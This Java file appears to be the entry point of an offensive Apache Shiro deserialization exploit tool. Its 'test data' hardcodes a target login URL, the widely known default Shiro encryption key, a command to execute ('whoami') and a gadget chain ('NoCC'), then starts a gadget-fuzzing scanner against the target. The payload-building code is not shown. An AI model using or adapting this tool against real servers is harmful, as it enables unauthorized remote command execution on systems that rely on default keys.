package core;

import core.scan.*;
import core.scan.eneity.ShiroTarget;
import core.scan.factory.ScannerFactory;

public class DearShiro {

    public static void main(String[] args) throws Exception {
//        String module = args[0];

        // test data
        String module = "gadgetfuzz";
        String base = "http://127.0.0.1:8000/login.jsp";
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String commnad = "whoami";
        String gadget = "NoCC";

        ShiroTarget target = new ShiroTarget(base, key, commnad, gadget);
        ScannerFactory factory = new ScannerFactory(target);
        ShiroScanner scanner = factory.getScanner(module);
        scanner.scan();
    }
}
